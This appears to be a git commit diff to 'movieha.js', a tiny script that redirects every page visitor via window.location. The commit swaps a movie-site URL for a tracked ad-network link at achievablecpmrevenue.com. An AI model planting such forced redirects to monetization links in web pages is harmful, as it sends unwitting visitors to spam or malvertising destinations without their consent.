f3b6512e36196ca3bb21e1c9accc9557eea02350
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-05-20 21:25:36 +0800

    Update movieha.js

--- movieha.js
+++ movieha.js
@@ -1,6 +1,6 @@
 var dataUrl = [
   
-  'https://dev-movie21hd.pantheonsite.io'
+  'https://www.achievablecpmrevenue.com/us5t0cbw?key=1c4590512e767b5008342ac53352ba10'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
